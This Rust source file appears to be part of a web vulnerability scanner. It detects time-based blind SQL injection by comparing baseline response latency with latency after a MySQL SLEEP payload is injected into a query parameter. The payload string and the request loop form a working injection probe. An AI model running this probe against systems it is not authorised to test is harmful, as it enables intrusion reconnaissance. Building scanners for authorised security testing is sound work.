use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use reqwest::Method;
use url::Url;

#[derive(Debug, Clone)]
pub struct LatencyProfile {
    pub samples: Vec<u128>,
    pub mean: f64,
    pub variance: f64,
}

#[derive(Debug)]
pub struct TimeSqlResult {
    pub injectable: bool,
    pub confidence: f32,
    pub baseline: LatencyProfile,
    pub injected: LatencyProfile,
    pub signal_ratio: f64,
}

pub struct TimeBasedSqlEngine {
    pub samples: usize,
    pub delay_seconds: u64,
}

impl TimeBasedSqlEngine {
    pub fn new(samples: usize, delay_seconds: u64) -> Self {
        Self {
            samples,
            delay_seconds,
        }
    }

    // -----------------------------
    // STEP 1: Baseline sampler
    // -----------------------------
    pub async fn measure_baseline(
        &self,
        client: &HttpClient,
        url: &Url,
    ) -> anyhow::Result<LatencyProfile> {
        let mut samples = Vec::with_capacity(self.samples);

        for _ in 0..self.samples {
            let req = HttpRequest::new(Method::GET, url.clone());
            let resp = client.execute(req).await?;
            samples.push(resp.elapsed_ms);
        }

        Ok(build_profile(samples))
    }

    // -----------------------------
    // STEP 2: Injected sampler
    // -----------------------------
    pub async fn measure_injected(
        &self,
        client: &HttpClient,
        base_url: &Url,
        param: &str,
    ) -> anyhow::Result<LatencyProfile> {
        let mut samples = Vec::with_capacity(self.samples);
        let payload = self.delay_payload();

        for _ in 0..self.samples {
            let mut url = base_url.clone();
            url.query_pairs_mut().append_pair(param, &payload);

            let req = HttpRequest::new(Method::GET, url);
            let resp = client.execute(req).await?;
            samples.push(resp.elapsed_ms);
        }

        Ok(build_profile(samples))
    }

    // -----------------------------
    // STEP 3: Statistical decision
    // -----------------------------
    pub fn decide(
        &self,
        baseline: LatencyProfile,
        injected: LatencyProfile,
    ) -> TimeSqlResult {
        let delta = injected.mean - baseline.mean;
        let noise = (baseline.variance + injected.variance).sqrt();

        let signal_ratio = if noise > 0.0 {
            delta / noise
        } else {
            0.0
        };

        let (injectable, confidence) = classify_signal(signal_ratio);

        TimeSqlResult {
            injectable,
            confidence,
            baseline,
            injected,
            signal_ratio,
        }
    }

    fn delay_payload(&self) -> String {
        format!(
            "' OR (SELECT 1 FROM (SELECT SLEEP({}))a)-- ",
            self.delay_seconds
        )
    }
}

// -------------------------------------------------
// Classification logic (explainable)
// -------------------------------------------------
fn classify_signal(signal_ratio: f64) -> (bool, f32) {
    match signal_ratio {
        r if r >= 3.0 => (true, 0.95),
        r if r >= 2.0 => (true, 0.85),
        r if r >= 1.5 => (true, 0.70),
        _ => (false, 0.0),
    }
}

// -------------------------------------------------
// Math helpers
// -------------------------------------------------
fn build_profile(samples: Vec<u128>) -> LatencyProfile {
    let mean = calculate_mean(&samples);
    let variance = calculate_variance(&samples, mean);

    LatencyProfile {
        samples,
        mean,
        variance,
    }
}

fn calculate_mean(samples: &[u128]) -> f64 {
    let sum: u128 = samples.iter().sum();
    sum as f64 / samples.len() as f64
}

fn calculate_variance(samples: &[u128], mean: f64) -> f64 {
    samples
        .iter()
        .map(|&x| {
            let diff = x as f64 - mean;
            diff * diff
        })
        .sum::<f64>()
        / samples.len() as f64
}
